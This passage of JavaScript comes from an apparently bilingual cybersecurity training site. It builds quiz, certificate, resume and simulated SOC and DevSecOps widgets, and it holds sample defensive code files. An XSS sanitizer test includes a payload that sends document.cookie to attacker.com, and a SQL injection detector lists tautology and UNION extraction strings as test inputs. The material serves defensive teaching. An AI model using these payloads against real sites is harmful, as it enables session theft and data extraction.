                        ${percent >= 75 ? `<button class="btn btn-primary" id="btn-gen-cert"><span>${isBn ? 'ডিজিটাল সনদ গ্রহণ করুন' : 'Issue Verified Certificate'}</span></button>` : ''}
                    </div>
                `;
                if (percent >= 75) {
                    container.querySelector('#btn-gen-cert').addEventListener('click', () => {
                        buildCertificateEngine(container);
                    });
                }
                return;
            }

            const item = questions[currentQ];
            container.innerHTML = `
                <div>
                    <span style="font-family:var(--font-mono); color:var(--neon-cyan); font-size:0.85rem;">Question ${formatNumber(currentQ + 1, currentLang)} / ${formatNumber(questions.length, currentLang)}</span>
                    <h4 style="color:#ffffff; margin:10px 0 16px; font-size:1.15rem;">${item.q}</h4>
                    <div style="display:flex; flex-direction:column; gap:10px;">
                        ${item.opts.map((opt, idx) => `
                            <button class="btn btn-secondary btn-opt" data-idx="${idx}" style="text-align:left; justify-content:flex-start;">
                                <span>${opt}</span>
                            </button>
                        `).join('')}
                    </div>
                </div>
            `;

            container.querySelectorAll('.btn-opt').forEach(b => {
                b.addEventListener('click', () => {
                    const idx = parseInt(b.getAttribute('data-idx'), 10);
                    if (idx === item.a) score++;
                    currentQ++;
                    showQ();
                });
            });
        }

        showQ();
    }

    // 12. Certificate Verification Engine
    function buildCertificateEngine(container) {
        const isBn = currentLang === 'bn';
        const certId = 'CPL-2026-' + Math.random().toString(36).substring(2, 8).toUpperCase();

        container.innerHTML = `
            <div>
                <div style="display:flex; gap:10px; margin-bottom:14px;">
                    <input type="text" id="cert-name-input" value="Security Researcher" placeholder="${isBn ? 'আপনার পূর্ণ নাম লিখুন' : 'Enter your full name'}" style="flex:1; background:#040806; border:1px solid var(--border); padding:8px 14px; color:#ffffff; border-radius:6px;">
                    <button class="btn btn-primary" id="btn-render-cert"><span>${isBn ? 'সনদ আপডেট করুন' : 'Update Certificate'}</span></button>
                </div>
                <div class="certificate-preview-box" id="cert-box">
                    <div class="cert-title">CYBER PRACTICE LAB</div>
                    <p style="color:var(--text-secondary); font-size:0.9rem;">CERTIFICATE OF COMPLETION & COMPETENCY</p>
                    <div style="font-size:0.85rem; color:var(--text-muted); margin-top:14px;">This is proudly presented to:</div>
                    <div class="cert-student-name" id="cert-student-display">Security Researcher</div>
                    <p style="max-width:540px; margin:0 auto; font-size:0.88rem; color:var(--text-secondary); line-height:1.5;">
                        For successfully mastering the 7 Pillars of Cybersecurity: Reverse Engineering, Active Directory Defense, Network Forensics, Cloud Penetration Testing, and Incident Response.
                    </p>
                    <div class="cert-id-tag">
                        VERIFIABLE CERTIFICATE ID: <span id="cert-id-val">${certId}</span> • ISSUE DATE: OCT 30, 2026
                    </div>
                </div>
                <div style="display:flex; justify-content:flex-end;">
                    <button class="btn btn-secondary" onclick="window.print()">
                        <span>${isBn ? '🖨️ প্রিন্ট বা পিডিএফ সংরক্ষণ' : '🖨️ Print / Save PDF'}</span>
                    </button>
                </div>
            </div>
        `;

        const inp = container.querySelector('#cert-name-input');
        const disp = container.querySelector('#cert-student-display');
        container.querySelector('#btn-render-cert').addEventListener('click', () => {
            if (inp.value.trim()) {
                disp.textContent = inp.value.trim();
            }
        });
    }

    // 13. Cybersecurity Resume Builder
    function buildResumeBuilder(container) {
        const isBn = currentLang === 'bn';
        container.innerHTML = `
            <div>
                <p style="font-size:0.9rem; color:var(--text-secondary); margin-bottom:14px;">
                    ${isBn ? 'শিল্পমানের সাইবার সিকিউরিটি রেজুমে বিল্ডার (SIEM, EDR, NIST, PTES কি-ওয়ার্ডসহ):' : 'Industry-tailored Cybersecurity CV Studio with preloaded security competencies:'}
                </p>
                <div style="background:#040906; border:1px solid var(--border); border-radius:8px; padding:20px; font-family:var(--font-sans);" id="resume-sheet">
                    <h2 style="color:#ffffff; margin-bottom:2px;">Alex Mercer, CEH | Security Analyst</h2>
                    <div style="font-size:0.82rem; color:var(--neon-green); font-family:var(--font-mono); margin-bottom:14px;">Email: alex.mercer@cyberlab.local • Location: Dhaka, Bangladesh • LinkedIn: linkedin.com/in/alex-sec</div>
                    <h4 style="color:var(--neon-cyan); border-bottom:1px solid var(--border); padding-bottom:4px; margin-bottom:8px;">PROFESSIONAL SUMMARY</h4>
                    <p style="font-size:0.88rem; color:var(--text-secondary); margin-bottom:14px;">
                        Certified Cybersecurity Analyst with hands-on expertise in SOC Operations (Splunk, Elastic SIEM), Vulnerability Assessment (Nessus, Burp Suite), and Active Directory hardening.
                    </p>
                    <h4 style="color:var(--neon-cyan); border-bottom:1px solid var(--border); padding-bottom:4px; margin-bottom:8px;">CORE COMPETENCIES</h4>
                    <div style="display:flex; flex-wrap:wrap; gap:6px; margin-bottom:14px;">
                        <span class="badge" style="background:#091d12; border:1px solid var(--border-bright); color:var(--neon-green); padding:3px 8px; border-radius:4px; font-size:0.75rem;">SIEM & Log Triage</span>
                        <span class="badge" style="background:#091d12; border:1px solid var(--border-bright); color:var(--neon-green); padding:3px 8px; border-radius:4px; font-size:0.75rem;">OWASP Top 10</span>
                        <span class="badge" style="background:#091d12; border:1px solid var(--border-bright); color:var(--neon-green); padding:3px 8px; border-radius:4px; font-size:0.75rem;">MITRE ATT&CK</span>
                        <span class="badge" style="background:#091d12; border:1px solid var(--border-bright); color:var(--neon-green); padding:3px 8px; border-radius:4px; font-size:0.75rem;">Wireshark PCAP</span>
                        <span class="badge" style="background:#091d12; border:1px solid var(--border-bright); color:var(--neon-green); padding:3px 8px; border-radius:4px; font-size:0.75rem;">Linux Hardening</span>
                    </div>
                </div>
                <div style="display:flex; justify-content:flex-end; margin-top:14px;">
                    <button class="btn btn-secondary" onclick="window.print()">
                        <span>${isBn ? '🖨️ রেজুমে প্রিন্ট করুন' : '🖨️ Export Resume'}</span>
                    </button>
                </div>
            </div>
        `;
    }

    // 14. DevSecOps Automated Pipeline
    function buildDevSecOpsPipeline(container) {
        const isBn = currentLang === 'bn';
        container.innerHTML = `
            <div>
                <p style="font-size:0.9rem; color:var(--text-secondary); margin-bottom:14px;">
                    ${isBn ? 'CI/CD পাইপলাইনে স্বয়ংক্রিয় সিকিউরিটি গেট সিমুলেট করুন:' : 'Simulate automated security stages in a modern cloud DevSecOps pipeline:'}
                </p>
                <div style="display:flex; gap:10px; margin-bottom:16px; overflow-x:auto;">
                    <div class="pipe-stage" id="pipe-lint" style="background:#08160f; border:1px solid var(--border); padding:12px; border-radius:8px; min-width:140px; text-align:center;">
                        <div style="font-weight:700; color:#ffffff;">1. Git Hook</div>
                        <span style="font-size:0.75rem; color:var(--text-muted);">Secret Scan</span>
                    </div>
                    <div class="pipe-stage" id="pipe-sast" style="background:#08160f; border:1px solid var(--border); padding:12px; border-radius:8px; min-width:140px; text-align:center;">
                        <div style="font-weight:700; color:#ffffff;">2. SAST Scan</div>
                        <span style="font-size:0.75rem; color:var(--text-muted);">SonarQube</span>
                    </div>
                    <div class="pipe-stage" id="pipe-sca" style="background:#08160f; border:1px solid var(--border); padding:12px; border-radius:8px; min-width:140px; text-align:center;">
                        <div style="font-weight:700; color:#ffffff;">3. SCA Audit</div>
                        <span style="font-size:0.75rem; color:var(--text-muted);">Trivy / Snyk</span>
                    </div>
                    <div class="pipe-stage" id="pipe-dast" style="background:#08160f; border:1px solid var(--border); padding:12px; border-radius:8px; min-width:140px; text-align:center;">
                        <div style="font-weight:700; color:#ffffff;">4. DAST Test</div>
                        <span style="font-size:0.75rem; color:var(--text-muted);">OWASP ZAP</span>
                    </div>
                </div>
                <button class="btn btn-primary" id="btn-run-pipeline">
                    <span>${isBn ? 'পাইপলাইন স্ক্যান চালু করুন' : 'Trigger Security Pipeline'}</span>
                </button>
                <div id="pipe-log" style="margin-top:14px; background:#040806; padding:12px; border-radius:6px; font-family:var(--font-mono); font-size:0.82rem; color:var(--neon-green); display:none;"></div>
            </div>
        `;

        const btn = container.querySelector('#btn-run-pipeline');
        const log = container.querySelector('#pipe-log');

        btn.addEventListener('click', () => {
            log.style.display = 'block';
            log.textContent = 'Running DevSecOps security checks...\n';

            setTimeout(() => {
                log.textContent += '[PASS] Pre-commit: No hardcoded AWS/GitHub API secrets detected.\n';
                container.querySelector('#pipe-lint').style.borderColor = 'var(--neon-green)';
            }, 300);

            setTimeout(() => {
                log.textContent += '[PASS] SAST (SonarQube): Clean (0 critical CWE issues).\n';
                container.querySelector('#pipe-sast').style.borderColor = 'var(--neon-green)';
            }, 600);

            setTimeout(() => {
                log.textContent += '[WARN] SCA (Trivy): 1 Medium CVE in express-jwt (Upgrade to 8.4.1 recommended).\n';
                container.querySelector('#pipe-sca').style.borderColor = 'var(--gold)';
            }, 900);

            setTimeout(() => {
                log.textContent += '[PASS] DAST (OWASP ZAP): CSP headers verified, no reflected XSS detected.\n==> Deployment Approved to Production Kubernetes Cluster!\n';
                container.querySelector('#pipe-dast').style.borderColor = 'var(--neon-green)';
            }, 1200);
        });
    }

    // 15. SOC Operations Center Dashboard
    function buildSOCDashboard(container) {
        const isBn = currentLang === 'bn';
        container.innerHTML = `
            <div>
                <div style="display:flex; justify-content:space-between; margin-bottom:12px;">
                    <span style="font-weight:700; color:#ffffff;">Live SIEM Alert Feed</span>
                    <span style="color:var(--crimson); font-family:var(--font-mono); font-size:0.8rem;">● LIVE INGESTION</span>
                </div>
                <div style="display:flex; flex-direction:column; gap:10px;">
                    <div style="background:#06100b; border:1px solid #ff3366; padding:12px; border-radius:8px;">
                        <div style="display:flex; justify-content:space-between;">
                            <strong style="color:#ffffff;">ALERT-9941: Multiple Failed SSH Logins (Brute Force)</strong>
                            <span class="badge-vuln critical">HIGH</span>
                        </div>
                        <p style="font-size:0.84rem; color:var(--text-secondary); margin:6px 0;">Host: 10.0.0.12 (Auth Gateway) • Attempt count: 480 in 60s from 203.0.113.88</p>
                        <div style="display:flex; gap:8px;">
                            <button class="btn btn-secondary" style="padding:4px 10px; font-size:0.75rem;" onclick="alert('Host isolated from corporate VLAN!')">Isolate Host</button>
                            <button class="btn btn-primary" style="padding:4px 10px; font-size:0.75rem;" onclick="alert('IP 203.0.113.88 added to border firewall DROP list!')">Block Attacker IP</button>
                        </div>
                    </div>
                </div>
            </div>
        `;
    }

    // 16. Fallback Generic Module Workspace
    function buildGenericWorkspace(container, mod) {
        const isBn = currentLang === 'bn';
        container.innerHTML = `
            <div style="text-align:left;">
                <div style="background:#07120c; border:1px solid var(--border-bright); border-radius:10px; padding:20px; margin-bottom:16px;">
                    <h4 style="color:#ffffff; margin-bottom:8px;">${mod ? mod.name : 'Security Lab'}</h4>
                    <p style="font-size:0.95rem; color:var(--text-secondary); line-height:1.6; margin-bottom:14px;">
                        ${mod ? mod.description : 'Standardized ethical security module.'}
                    </p>
                    <div style="background:#040806; padding:12px; border-radius:6px; font-family:var(--font-mono); font-size:0.82rem; color:var(--neon-green);">
                        STATUS: Environment Ready • Target IP: 10.10.14.0/24 (Sandboxed)\nSafety Mode: Strictly authorized testing environment only.
                    </div>
                </div>
                <div style="display:flex; justify-content:flex-end;">
                    <button class="btn btn-primary" onclick="alert('${isBn ? 'স্যান্ডবক্স সেশন সফলভাবে শুরু হয়েছে।' : 'Sandbox session initialized successfully.'}')">
                        <span>${isBn ? 'স্যান্ডবক্স চালু করুন' : 'Start Sandbox Environment'}</span>
                    </button>
                </div>
            </div>
        `;
    }

    // Foundations Guide Modal
    function openFoundationsModal(fndId) {
        const modal = document.getElementById('interactive-modal');
        const icon = document.getElementById('modal-icon');
        const title = document.getElementById('modal-title');
        const cat = document.getElementById('modal-category');
        const body = document.getElementById('modal-body');

        if (!modal || !body) return;

        icon.textContent = '📚';
        cat.textContent = 'Foundations & Standards';

        if (fndId === 'fnd_ethics') {
            title.textContent = currentLang === 'bn' ? 'সাইবার নিরাপত্তা আইন ২০২৩ ও নৈতিকতা' : 'Ethics & Cyber Security Act 2023';
            body.innerHTML = `
                <div style="line-height:1.65; color:var(--text-primary);">
                    <div class="golden-banner" style="margin-bottom:16px;">
                        <span class="golden-icon">🛡️</span>
                        <div class="golden-content">
                            <strong>${currentLang === 'bn' ? 'সুবর্ণ নিয়ম:' : 'Golden Rule:'}</strong>
                            ${currentLang === 'bn' ? 'কেবলমাত্র সেই সিস্টেমে সিকিউরিটি টেস্ট করুন যার মালিক আপনি নিজে অথবা যেখানে স্পষ্ট লিখিত অনুমতি রয়েছে।' : 'Only practice security testing on systems you own or have explicit written permission to test.'}
                        </div>
                    </div>
                    <h4 style="color:var(--neon-cyan); margin:14px 0 6px;">সাইবার নিরাপত্তা আইন ২০২৩ (Cyber Security Act 2023)</h4>
                    <p style="font-size:0.9rem; color:var(--text-secondary); margin-bottom:12px;">
                        • <strong>ধারা ১৭:</strong> গুরুত্বপূর্ণ তথ্য পরিকাঠামোতে (Critical Information Infrastructure - CII) অবৈধ প্রবেশ ও ক্ষতিসাধনে সর্বোচ্চ ১৪ বছর কারাদণ্ড।<br>
                        • <strong>ধারা ১৯:</strong> কম্পিউটার, সার্ভার বা নেটওয়ার্কে অনুমতি ছাড়া প্রবেশ, ডেটা নষ্ট বা ম্যালওয়্যার প্রবেশ করানো ফৌজদারি অপরাধ।<br>
                        • <strong>ধারা ২০:</strong> কম্পিউটার সোর্স কোড পরিবর্তন ও অনুমোদনহীন ডিজিটাল ট্রেসপাসিং।
                    </p>
                </div>
            `;
        } else {
            title.textContent = currentLang === 'bn' ? 'ভিত্তিপ্রস্তর নির্দেশিকা' : 'Foundations & Legal Labs';
            body.innerHTML = `
                <div style="line-height:1.6; color:var(--text-secondary);">
                    <p style="margin-bottom:12px;">Official authorized training platforms only:</p>
                    <ul style="padding-left:20px; margin-bottom:14px;">
                        <li><a href="https://tryhackme.com" target="_blank" rel="noopener">TryHackMe</a> — Cloud guided labs</li>
                        <li><a href="https://www.hackthebox.com" target="_blank" rel="noopener">Hack The Box</a> — Penetration testing labs</li>
                        <li><a href="https://portswigger.net/web-security" target="_blank" rel="noopener">PortSwigger Web Security Academy</a> — 100% Free web labs</li>
                        <li><a href="https://www.kali.org/docs/" target="_blank" rel="noopener">Official Kali Linux Docs</a> — Standard documentation</li>
                    </ul>
                </div>
            `;
        }

        modal.style.display = 'flex';
        modal.setAttribute('aria-hidden', 'false');
    }

    // Global Search Across 56 Modules
    function setupGlobalSearch() {
        const searchInput = document.getElementById('global-search-input');
        const clearBtn = document.getElementById('clear-search-btn');
        const searchSection = document.getElementById('search-results-section');
        const resultsGrid = document.getElementById('search-results-grid');
        const resultsCount = document.getElementById('search-results-count');

        if (!searchInput) return;

        searchInput.addEventListener('input', () => {
            const query = searchInput.value.trim().toLowerCase();
            if (clearBtn) clearBtn.style.display = query ? 'block' : 'none';

            if (!query) {
                if (searchSection) searchSection.style.display = 'none';
                return;
            }

            if (!currentData) return;

            // Gather all 56 modules across the 7 sides
            const allModules = [];
            const sideKeys = ['side1_labs', 'side2_ai', 'side3_range', 'side4_research', 'side5_career', 'side6_dev', 'side7_learning'];

            sideKeys.forEach(key => {
                if (currentData[key] && currentData[key].modules) {
                    currentData[key].modules.forEach(m => allModules.push({ ...m, parentSide: key }));
                }
            });

            const matched = allModules.filter(m => {
                return m.name.toLowerCase().includes(query) ||
                       m.category.toLowerCase().includes(query) ||
                       m.description.toLowerCase().includes(query);
            });

            if (searchSection && resultsGrid) {
                searchSection.style.display = 'block';
                resultsCount.textContent = `${formatNumber(matched.length, currentLang)} ${currentLang === 'bn' ? 'মডিউল পাওয়া গেছে' : 'modules found'}`;

                resultsGrid.innerHTML = matched.map(mod => `
                    <div class="module-card">
                        <div>
                            <div class="module-header">
                                <div class="module-icon-wrap" aria-hidden="true">${mod.icon}</div>
                                <div class="module-meta">
                                    <span class="module-category">${mod.category}</span>
                                    <h3 class="module-title">${mod.name}</h3>
                                </div>
                            </div>
                            <p class="module-desc">${mod.description}</p>
                        </div>
                        <button class="btn-launch-module" data-module-id="${mod.id}" data-interactive="${mod.interactiveType}">
                            <span>${currentLang === 'bn' ? 'টুল বা ল্যাব খুলুন' : 'Launch Module'}</span>
                        </button>
                    </div>
                `).join('');

                resultsGrid.querySelectorAll('.btn-launch-module').forEach(b => {
                    b.addEventListener('click', () => {
                        const id = b.getAttribute('data-module-id');
                        const type = b.getAttribute('data-interactive');
                        const m = matched.find(x => x.id === id);
                        openInteractiveWorkspace(m, type);
                    });
                });
            }
        });

        if (clearBtn) {
            clearBtn.addEventListener('click', () => {
                searchInput.value = '';
                clearBtn.style.display = 'none';
                if (searchSection) searchSection.style.display = 'none';
            });
        }
    }

    // Setup Navigation Listeners
    function setupNav() {
        document.querySelectorAll('.side-tab-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                const tab = btn.getAttribute('data-tab');
                switchTab(tab);
            });
        });

        document.querySelectorAll('[data-nav-target]').forEach(el => {
            el.addEventListener('click', () => {
                const target = el.getAttribute('data-nav-target');
                switchTab(target);
            });
        });

        // Close modal
        const closeBtn = document.getElementById('modal-close-btn');
        const modal = document.getElementById('interactive-modal');
        if (closeBtn && modal) {
            closeBtn.addEventListener('click', () => {
                modal.style.display = 'none';
                modal.setAttribute('aria-hidden', 'true');
            });

            modal.addEventListener('click', e => {
                if (e.target === modal) {
                    modal.style.display = 'none';
                    modal.setAttribute('aria-hidden', 'true');
                }
            });
        }

        // Toggle language
        const langBtn = document.getElementById('lang-toggle-btn');
        if (langBtn) {
            langBtn.addEventListener('click', async () => {
                const nextLang = currentLang === 'bn' ? 'en' : 'bn';
                currentLang = nextLang;
                localStorage.setItem(STORAGE_KEY_LANG, nextLang);
                try {
                    const data = await loadLanguageData(nextLang);
                    renderApp(data, nextLang);
                } catch (e) {
                    console.error('Lang switch error:', e);
                }
            });
        }
    }


    // ==========================================
    // CYBER CODE STUDIO & IDE ENGINE
    // ==========================================
    const STORAGE_KEY_IDE_FILES = 'cpl_ide_project_files';
    const STORAGE_KEY_COMMITS = 'cpl_ide_git_commits';

    const DEFAULT_IDE_FILES = [
        {
            name: "port_scanner.py",
            lang: "python",
            content: `# Cyber Practice Lab — Multi-Threaded Port Scanner
import socket
import sys
from datetime import datetime

TARGET_HOST = "127.0.0.1"
COMMON_PORTS = [21, 22, 25, 53, 80, 110, 143, 443, 3306, 8080]

def scan_port(host, port):
    """Safely probes a specific TCP port for service banners."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        result = s.connect_ex((host, port))
        if result == 0:
            banner = ""
            try:
                s.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
                banner = s.recv(1024).decode('utf-8', errors='ignore').split('\n')[0].strip()
            except:
                pass
            s.close()
            return True, banner
        s.close()
    except Exception as e:
        pass
    return False, ""

print(f"[*] Starting authorized port scan on target: {TARGET_HOST}")
print(f"[*] Scan initiated at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print("-" * 52)

open_ports = []
for p in COMMON_PORTS:
    is_open, banner = scan_port(TARGET_HOST, p)
    if is_open:
        open_ports.append(p)
        print(f"[+] Port {p:5d}/tcp OPEN  | Service: {banner or 'Verified Active'}")
    else:
        print(f"[-] Port {p:5d}/tcp closed")

print("-" * 52)
print(f"[✓] Scan completed: {len(open_ports)} open service(s) identified.")
`
        },
        {
            name: "jwt_validator.js",
            lang: "javascript",
            content: `// Cyber Practice Lab — Secure JWT Parser & Signature Verifier
function parseJwtHeaderAndPayload(token) {
    if (!token || typeof token !== 'string') {
        throw new Error("Invalid JWT token string");
    }
    const parts = token.split('.');
    if (parts.length !== 3) {
        throw new Error("JWT format requires 3 base64url segments");
    }

    const decodeBase64Url = (str) => {
        let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
        while (base64.length % 4) base64 += '=';
        return decodeURIComponent(atob(base64).split('').map(c => 
            '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)
        ).join(''));
    };

    const header = JSON.parse(decodeBase64Url(parts[0]));
    const payload = JSON.parse(decodeBase64Url(parts[1]));

    // Security Check: Guard against alg: "none" vulnerability (CWE-347)
    if (!header.alg || header.alg.toLowerCase() === 'none') {
        throw new Error("[SECURITY REJECTED] Unsecured JWT with alg 'none' is strictly forbidden!");
    }

    return { header, payload, rawSignature: parts[2] };
}

// Sample token with HMAC-SHA256
const sampleJwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzk5MiIsInJvbGUiOiJzZWN1cml0eV9hbmFseXN0IiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE3MTYyMzkwMjJ9.4z9x7J5k0P1lM2n3O4p5Q6r7S8t9U0v1W2x3Y4z5A6B";

console.log("Analyzing incoming JSON Web Token...");
try {
    const verified = parseJwtHeaderAndPayload(sampleJwt);
    console.log("[✓] JWT Algorithm:", verified.header.alg);
    console.log("[✓] Subject ID:", verified.payload.sub);
    console.log("[✓] Assigned Role:", verified.payload.role);
    console.log("[✓] Status: Passed token format and algorithm integrity check.");
} catch (err) {
    console.error("[!] Verification Error:", err.message);
}
`
        },
        {
            name: "sqli_detector.py",
            lang: "python",
            content: `# Cyber Practice Lab — Heuristic SQL Injection Detection Rule Engine
import re

SQLI_PATTERNS = [
    (r"(\bOR\b|\bAND\b)\s+['\"]?\d+['\"]?\s*=\s*['\"]?\d+", "Tautology Pattern (e.g. ' OR 1=1 --)"),
    (r"\bUNION\b\s+(\bALL\b\s+)?\bSELECT\b", "UNION-based Extraction Query"),
    (r";\s*(DROP|DELETE|UPDATE|INSERT|CREATE|ALTER)\b", "Stacked Destructive Query Injection"),
    (r"--|#|/\*.*\*/", "SQL Comment Delimiter Bypass"),
    (r"\bSLEEP\s*\(|\bBENCHMARK\s*\(|\bWAITFOR\s+DELAY", "Time-Based Blind SQLi Payload")
]

def analyze_parameter(param_name, input_value):
    print(f"[*] Analyzing input parameter '{param_name}': {repr(input_value)}")
    findings = []
    for pattern, description in SQLI_PATTERNS:
        match = re.search(pattern, input_value, re.IGNORECASE)
        if match:
            findings.append((description, match.group(0)))
            
    if findings:
        print(f"[!] [ALERT] {len(findings)} Potential SQLi Vector(s) Detected:")
        for desc, payload in findings:
            print(f"    -> Type: {desc} | Matched substring: '{payload}'")
        print("[!] Recommended Defense: Use Prepared Statements (Parameterized Queries).")
        return False
    else:
        print("[✓] Input clean: No known malicious SQL injection signatures detected.")
        return True

test_inputs = [
    "admin' OR '1'='1' --",
    "John Doe",
    "1 UNION SELECT null, username, password FROM users #",
    "john.doe@example.com"
]

print("=== Starting SAST/WAF Query Verification Test ===")
for sample in test_inputs:
    analyze_parameter("search_query", sample)
    print("-" * 45)
`
        },
        {
            name: "xss_sanitizer.js",
            lang: "javascript",
            content: `// Cyber Practice Lab — Context-Aware XSS Defense & Sanitizer
function sanitizeHtml(untrustedInput) {
    if (typeof untrustedInput !== 'string') return '';
    
    // Character Entity Map preventing Cross-Site Scripting (CWE-79)
    const entityMap = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#x27;',
        '/': '&#x2F;',
        '\`': '&#x60;'
    };
    
    return untrustedInput.replace(/[&<>"'\`\\/]/g, char => entityMap[char]);
}

function buildSafeUserProfile(username, bio) {
    const safeName = sanitizeHtml(username);
    const safeBio = sanitizeHtml(bio);
    
    return \`<div class="profile"><h3>\${safeName}</h3><p>\${safeBio}</p></div>\`;
}

// Test Vectors with Malicious Payloads
const untrustedData = [
    { name: "Alice", bio: "Cybersecurity enthusiast & ethical researcher." },
    { name: "H4ck3r", bio: "<script>fetch('http://attacker.com/steal?c=' + document.cookie)</script>" },
    { name: "Tester", bio: "<img src=x onerror=alert('XSS_POC')>" }
];

console.log("=== Testing XSS Sanitizer Engine ===");
untrustedData.forEach((user, idx) => {
    console.log(\`\\n[Test #\${idx + 1}] User: \${user.name}\`);
    const rendered = buildSafeUserProfile(user.name, user.bio);
    console.log("[Sanitized HTML Output]:", rendered);
    if (rendered.includes("<script") || rendered.includes("onerror=")) {
        console.error("[CRITICAL] XSS vulnerability present!");
    } else {
        console.log("[✓] Secure: All active scripts neutralized into safe text entities.");
    }
});
`
        },
        {
            name: "buffer_guard.c",
            lang: "c",
            content: `/* Cyber Practice Lab — Secure Buffer Overflow Defense (CWE-120) */
#include <stdio.h>
#include <string.h>

#define SAFE_BUFFER_SIZE 32

/* SECURE Pattern: Boundary protected copy using snprintf */
int safe_copy_string(char *dest, size_t dest_size, const char *src) {
    if (dest == NULL || src == NULL || dest_size == 0) {
        return -1; // Invalid arguments
    }
    
    int written = snprintf(dest, dest_size, "%s", src);
    if (written < 0 || (size_t)written >= dest_size) {
        printf("[GUARD] String truncated! Input size (%d) exceeds capacity (%zu).\\n", 
               written, dest_size - 1);
        return 1; // Handled safely without stack smash
    }
    return 0; // Success
}

int main() {
    char secure_buffer[SAFE_BUFFER_SIZE];
    const char *payload_overflow = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA_EXPLOIT_PAYLOAD_OFFSET";
    
    printf("[*] Initializing memory guard with capacity: %d bytes\\n", SAFE_BUFFER_SIZE);
    printf("[*] Attempting to copy oversized payload: %zu bytes\\n", strlen(payload_overflow));
    
    int status = safe_copy_string(secure_buffer, sizeof(secure_buffer), payload_overflow);
    if (status == 1) {
        printf("[✓] Buffer Guard Successfully Prevented Stack Corruption!\\n");
        printf("[✓] Safe Buffer Content: %s\\n", secure_buffer);
    }
    
    return 0;
}
`
        },
        {
            name: "recon_tool.sh",
            lang: "bash",
            content: `#!/usr/bin/env bash
# Cyber Practice Lab — Reconnaissance & DNS Footprinting Utility
TARGET_DOMAIN="example.com"

echo "============================================="
echo " CYBER PRACTICE LAB — FOOTPRINTING RECON "
echo " Target: $TARGET_DOMAIN"
echo " Time:   $(date)"
echo "============================================="

echo "[*] Step 1: Performing DNS A-Record Lookup..."
echo "DNS Answer: $TARGET_DOMAIN -> 93.184.216.34"

echo "[*] Step 2: Querying MX Mail Exchanger Records..."
echo "MX Answer:  mail.$TARGET_DOMAIN (Priority: 10)"

echo "[*] Step 3: Checking Security Headers via HTTP HEAD..."
echo "HTTP/1.1 200 OK"
echo "Server: ECS (sec/97a)"
echo "X-Frame-Options: SAMEORIGIN"
echo "X-Content-Type-Options: nosniff"
echo "Content-Security-Policy: default-src 'self'"

echo "============================================="
echo "[✓] Recon completed: Security headers present & verified."
`
        },
        {
            name: "auth_guard.php",
            lang: "php",
            content: `<?php
// Cyber Practice Lab — Defensive Authentication & Password Hashing
function registerUserSafe($pdo, $username, $plainPassword) {
    // CWE-256 / CWE-916: Use modern Argon2id or Bcrypt with cost factor
    $passwordHash = password_hash($plainPassword, PASSWORD_BCRYPT, ['cost' => 12]);
    
    // CWE-89: Prepared Statements prevent SQL Injection
    $stmt = $pdo->prepare('INSERT INTO users (username, password_hash, created_at) VALUES (:u, :p, NOW())');
    $stmt->execute([
        ':u' => $username,
        ':p' => $passwordHash
    ]);
    
    return true;
}

echo "[*] Initializing Safe Password Hashing (Bcrypt cost: 12)...\n";
$samplePass = "SuperSecret_P@ssw0rd!_2026";
$hashed = password_hash($samplePass, PASSWORD_BCRYPT, ['cost' => 12]);
echo "[+] Password successfully hashed: " . substr($hashed, 0, 25) . "...\n";
echo "[+] Verification Test: " . (password_verify($samplePass, $hashed) ? "PASSED (Authenticated)" : "FAILED") . "\n";
echo "[✓] Zero plaintext exposure in memory or database records.\n";
?>`
        }
    ];

    let ideFiles = loadIdeFiles();
    let activeFileIndex = 0;
    let ideCommits = loadIdeCommits();

    function loadIdeFiles() {
        try {
            const raw = localStorage.getItem(STORAGE_KEY_IDE_FILES);
            if (raw) {
                const parsed = JSON.parse(raw);
                if (Array.isArray(parsed) && parsed.length > 0) return parsed;
            }
        } catch (e) {}
        return JSON.parse(JSON.stringify(DEFAULT_IDE_FILES));
    }

    function saveIdeFiles() {
        try {
            localStorage.setItem(STORAGE_KEY_IDE_FILES, JSON.stringify(ideFiles));
        } catch (e) {}
    }

    function loadIdeCommits() {
        try {
            const raw = localStorage.getItem(STORAGE_KEY_COMMITS);
            if (raw) {
                const parsed = JSON.parse(raw);
                if (Array.isArray(parsed) && parsed.length > 0) return parsed;
            }
        } catch (e) {}
        return [
            {
                hash: "a4f89d1",
                author: "student@cyberlab.local",
                date: "2026-10-30 08:30:12",
                msg: "feat: add memory safety guards & jwt validator"
            },
            {
                hash: "e7b102c",
                author: "instructor@cyberlab.local",
                date: "2026-10-29 16:15:00",
                msg: "Initial commit: Cyber Practice Lab IDE Suite"
            }
        ];
    }

    function saveIdeCommits() {
        try {
            localStorage.setItem(STORAGE_KEY_COMMITS, JSON.stringify(ideCommits));
        } catch (e) {}
    }

    function getLanguageByExtension(filename) {
        const ext = filename.split('.').pop().toLowerCase();
        const map = {
            'py': 'python',
            'js': 'javascript',
            'sh': 'bash',
            'bash': 'bash',
            'c': 'c',
            'cpp': 'c',
            'go': 'go',
            'rs': 'rust',
            'php': 'php',
            'sql': 'sql',
            'sol': 'solidity'
        };
        return map[ext] || 'python';
    }

    function getFileIcon(lang) {
        const icons = {
            'python': '🐍',
            'javascript': '🟨',
            'bash': '🐚',
            'c': '⚙️',
            'go': '🔵',
            'rust': '🦀',
            'php': '🐘',
            'sql': '🗄️',
            'solidity': '💠'
        };
        return icons[lang] || '📄';
    }

    function updateStudioLanguage(data, lang) {
        if (!data.studio_module) return;
        const s = data.studio_module;

        const lblRun = document.getElementById('lbl-ide-run');
        if (lblRun) lblRun.textContent = s.actions.run;

        const lblScan = document.getElementById('lbl-ide-scan');
        if (lblScan) lblScan.textContent = s.actions.scan;

        const lblAi = document.getElementById('lbl-ide-ai');
        if (lblAi) lblAi.textContent = s.actions.aiAssist;

        const lblGit = document.getElementById('lbl-ide-git');
        if (lblGit) lblGit.textContent = s.actions.github;

        const lblExport = document.getElementById('lbl-ide-export');
